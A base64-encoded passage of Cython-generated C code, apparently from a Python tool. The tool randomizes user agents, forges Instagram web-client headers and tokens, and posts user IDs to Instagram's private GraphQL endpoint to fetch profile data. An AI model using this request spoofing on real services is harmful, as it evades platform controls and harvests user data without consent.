VubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgNDIyLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMjFdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgNDIyLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9HZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfdF82KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgNDIyLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgICBfX3B5eF90XzYgPSBQeU51bWJlcl9BZGQoX19weXhfdF81LCBfX3B5eF90XzcpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MjIsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgICAgIF9fcHl4X3RfNyA9IFB5TnVtYmVyX0FkZChfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfU01fVCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQyMiwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgX19weXhfdF82ID0gUHlOdW1iZXJfQWRkKF9fcHl4X3RfNywgX19weXhfdl9ybmQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MjIsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgICAgIF9fcHl4X3RfNyA9IFB5TnVtYmVyX0FkZChfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfU01fVCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQyMiwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgX19weXhfdF82ID0gUHlOdW1iZXJfQWRkKF9fcHl4X3RfNywgX19weXhfdl9ybmQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MjIsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgICAgIF9fcHl4X3RfNyA9IFB5TnVtYmVyX0FkZChfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfcWNvbV9lbl9VU181NDU5ODYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA0MjIsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZG9tKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgNDIyLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRpbnQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MjIsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyMl0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MjIsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X1VuaWNvZGUoX19weXhfdF82KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDIyLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgICBfX3B5eF90XzYgPSBQeU51bWJlcl9BZGQoX19weXhfdF83LCBfX3B5eF90XzUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MjIsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgIF9fcHl4X3RfNSA9IFB5TnVtYmVyX0FkZChfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzIyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDIyLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF92X3VzZXJfYWdlbnQsIF9fcHl4X3RfNSk7XG4gICAgICAgICAgX19weXhfdF81ID0gMDtcblxuICAgICAgICAgIFxuICAgICAgICAgIF9fcHl4X3RfNiA9IE5VTEw7XG4gICAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kX2lkcyk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQyMywgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgICAgX19weXhfdF84ID0gMTtcbiAgICAgICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNykpKSB7XG4gICAgICAgICAgICBfX3B5eF90XzYgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzcpO1xuICAgICAgICAgICAgYXNzZXJ0KF9fcHl4X3RfNik7XG4gICAgICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNyk7XG4gICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF82KTtcbiAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzcsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgICAgICBfX3B5eF90XzggPSAwO1xuICAgICAgICAgIH1cbiAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICB7XG4gICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbM10gPSB7X19weXhfdF82LCBfX3B5eF92X2JiaywgX19weXhfdl9JZG99O1xuICAgICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF83LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzgsICgzLV9fcHl4X3RfOCkgfCAoX19weXhfdF84Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MjMsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgfVxuICAgICAgICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfSWQsIF9fcHl4X3RfNSk7XG4gICAgICAgICAgX19weXhfdF81ID0gMDtcblxuICAgICAgICAgIFxuICAgICAgICAgIF9fcHl4X3RfNSA9IF9fcHl4X3BmXzJqcV8zdXV1X2dlbmV4cHIoTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQyNCwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgX19weXhfdF83ID0gX19QeXhfR2VuZXJhdG9yX0dldElubGluZWRSZXN1bHQoX19weXhfdF81KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgNDI0LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgICBfX3B5eF90XzUgPSBQeVVuaWNvZGVfSm9pbihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18yLCBfX3B5eF90XzcpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MjQsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfbHNkLCAoKFB5T2JqZWN0KilfX3B5eF90XzUpKTtcbiAgICAgICAgICBfX3B5eF90XzUgPSAwO1xuXG4gICAgICAgICAgXG4gICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDEwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDI3LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYWNjZXB0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQyNywgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hY2NlcHRfbGFuZ3VhZ2UsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZW5fZW5fVVNfcV8wXzkpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDI3LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2NvbnRlbnRfdHlwZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hcHBsaWNhdGlvbl94X3d3d19mb3JtX3VybGVuY29kZV8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQyNywgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RudCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQyNywgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29yaWdpbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc193d3dfaW5zdGFncmFtX2NvbV8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQyNywgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3ByaW9yaXR5LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3VfMV9pKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQyNywgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlZmVyZXIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaHR0cHNfd3d3X2luc3RhZ3JhbV9jb21fY3Jpc3RpYW4pIDwgKDApKSBfX1BZWF9FUlIoMCwgNDI3LCBfX3B5eF9MNV9lcnJvcilcblxuICAgICAgICAgIFxuICAgICAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfdXNlcl9hZ2VudCwgX19weXhfdl91c2VyX2FnZW50KSA8ICgwKSkgX19QWVhfRVJSKDAsIDQyNywgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV94X2ZiX2ZyaWVuZGx5X25hbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9Qb2xhcmlzVXNlckhvdmVyQ2FyZENvbnRlbnRWMlF1ZSkgPCAoMCkpIF9fUFlYX0VSUigwLCA0MjcsIF9fcHl4X0w1X2Vycm9yKVxuXG4gICAgICAgICAgXG4gICAgICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV94X2ZiX2xzZCwgX19weXhfdl9sc2QpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDI3LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF92X2hlYWRlcnMsICgoUHlPYmplY3QqKV9fcHl4X3RfNSkpO1xuICAgICAgICAgIF9fcHl4X3RfNSA9IDA7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoNik7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQzOSwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2xzZCwgX19weXhfdl9sc2QpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDM5LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZmJfYXBpX2NhbGxlcl9jbGFzcywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1JlbGF5TW9kZXJuKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQzOSwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2ZiX2FwaV9yZXFfZnJpZW5kbHlfbmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1BvbGFyaXNVc2VySG92ZXJDYXJkQ29udGVudFYyUXVlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQzOSwgX19weXhfTDVfZXJyb3IpXG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9Vbmljb2RlKF9fcHl4X3ZfSWQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA0NDIsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5VW5pY29kZV9Db25jYXQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV91c2VySUQsIF9fcHl4X3RfNyk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQ0MiwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgICAgX19weXhfdF83ID0gX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2UoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3VzZXJuYW1lX2NyaXN0aWFubyk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQ0MiwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3ZhcmlhYmxlcywgX19weXhfdF83KSA8ICgwKSkgX19QWVhfRVJSKDAsIDQzOSwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NlcnZlcl90aW1lc3RhbXBzLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdHJ1ZSkgPCAoMCkpIF9fUFlYX0VSUigwLCA0MzksIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kb2NfaWQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfNzcxNzI2OTQ4ODMzNjAwMSkgPCAoMCkpIF9fUFlYX0VSUigwLCA0MzksIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfZGF0YSwgKChQeU9iamVjdCopX19weXhfdF81KSk7XG4gICAgICAgICAgX19weXhfdF81ID0gMDtcblxuICAgICAgICAgIFxuICAgICAgICAgIF9fcHl4X3RfNyA9IE5VTEw7XG4gICAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0cyk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQ0NywgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9wb3N0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDQ3LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcblxuICAgICAgICAgIFxuICAgICAgICAgIF9fcHl4X3RfOCA9IDE7XG4gICAgICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzQpKSkge1xuICAgICAgICAgICAgX19weXhfdF83ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF80KTtcbiAgICAgICAgICAgIGFzc2VydChfX3B5eF90XzcpO1xuICAgICAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzQpO1xuICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF80LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICAgICAgX19weXhfdF84ID0gMDtcbiAgICAgICAgICB9XG4gICAgICAgICAgI2VuZGlmXG4gICAgICAgICAge1xuICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDIgOiAwKV0gPSB7X19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2h0dHBzX3d3d19pbnN0YWdyYW1fY29tX2FwaV9ncmFwfTtcbiAgICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoMik7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQ0NywgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hlYWRlcnMsIF9fcHl4X3ZfaGVhZGVycywgX19weXhfdF82LCBfX3B5eF9jYWxsYXJncysyLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQ0NywgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF92X2RhdGEsIF9fcHl4X3RfNiwgX19weXhfY2FsbGFyZ3MrMiwgMSkgPCAoMCkpIF9fUFlYX0VSUigwLCA0NDcsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgICAgX19weXhfdF81ID0gX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyKF9fcHl4X3RfNCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF84LCAoMi1fX3B5eF90XzgpIHwgKF9fcHl4X3RfOCpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpLCBfX3B5eF90XzYpO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQ0NywgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICB9XG4gICAgICAgICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfdl9yZXNwb25zZSwgX19weXhfdF81KTtcbiAgICAgICAgICBfX3B5eF90XzUgPSAwO1xuXG4gICAgICAgICAgXG4gICAgICAgICAgX19weXhfdF8xMiA9IF9fcHl4X3ZfcmVzcG9uc2U7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgICAgIF9fcHl4X3RfOCA9IDA7XG4gICAgICAgICAge1xuICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTIsIE5VTEx9O1xuICAgICAgICAgICAgX19weXhfdF8xMSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9qc29uLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzgsICgxLV9fcHl4X3RfOCkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDQ0OSwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7XG4gICAgICAgICAgfVxuICAgICAgICAgIF9fcHl4X3RfMTAgPSBfX3B5eF90XzExO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEwKTtcbiAgICAgICAgI